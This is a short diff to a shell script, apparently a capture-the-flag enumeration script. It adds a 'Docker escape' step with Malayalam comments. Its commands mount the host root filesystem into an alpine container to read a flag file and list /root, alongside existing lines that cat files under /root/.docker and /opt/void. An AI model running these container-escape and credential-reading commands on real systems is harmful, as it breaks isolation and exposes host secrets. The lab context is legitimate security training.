@@ -38,3 +38,10 @@ sudo find /var/run/docker.sock -exec ls -la {} \; 2>/dev/null
 sudo find /root/.docker -type f -exec cat {} \; 2>/dev/null
 sudo find /opt/void/ -type f -exec cat {} \; 2>/dev/null
 sudo find / -name "docker_flag*" -o -name "*docker*flag*" 2>/dev/null
+echo "=== DOCKER ESCAPE & FLAG EXTRACTION ==="
+# ഹോസ്റ്റ് മെഷീനിൽ നിന്ന് ഡോക്കർ ഫ്ലാഗ് തിരയാൻ
+# നമ്മൾ പുതിയൊരു കണ്ടെയ്നർ റൺ ചെയ്ത് ഹോസ്റ്റ് ഫയൽ സിസ്റ്റം മൗണ്ട് ചെയ്യുന്നു
+sudo docker run --rm -v /:/host_fs alpine cat /host_fs/opt/void/docker_flag.txt 2>/dev/null || echo "Flag not found in default path"
+
+# ഹോസ്റ്റ് മെഷീനിലെ റൂട്ട് ഡയറക്ടറി ലിസ്റ്റ് ചെയ്യാൻ
+sudo docker run --rm -v /:/host_fs alpine ls -la /host_fs/root/
